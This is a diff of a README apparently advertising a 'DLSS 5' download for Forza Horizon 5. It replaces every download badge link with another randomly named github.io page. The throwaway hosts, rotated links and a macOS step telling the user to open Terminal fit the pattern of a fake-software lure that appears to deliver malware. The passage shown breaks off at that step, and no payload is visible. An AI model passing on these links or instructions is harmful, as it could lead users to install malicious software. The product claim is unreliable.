@@ -21,7 +21,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Forza%20Horizon%205_DLSS_5-F9A825?style=for-the-badge&logo=github)](https://zfboreoxhmwh.github.io/win-dl/)
+[![Download](https://img.shields.io/badge/⬇_Download_Forza%20Horizon%205_DLSS_5-F9A825?style=for-the-badge&logo=github)](https://tlwbljvlzhgm.github.io/windows-install/)
 
 </div>
 
@@ -54,9 +54,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zfboreoxhmwh.github.io/win-dl/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://tlwbljvlzhgm.github.io/windows-install/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://FlagArcher36.github.io/macos-pkg/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://tlwbljvlzhgm.github.io/macos-install/)
 
 </div>
 
@@ -70,7 +70,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_DLSS_5_for_Forza%20Horizon%205-F9A825?style=for-the-badge&logo=github)](https://zfboreoxhmwh.github.io/win-dl/)
+[![Download](https://img.shields.io/badge/⬇_Download_DLSS_5_for_Forza%20Horizon%205-F9A825?style=for-the-badge&logo=github)](https://tlwbljvlzhgm.github.io/windows-install/)
 
 </div>
 
@@ -102,7 +102,7 @@
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://FlagArcher36.github.io/macos-pkg/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://tlwbljvlzhgm.github.io/macos-install/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
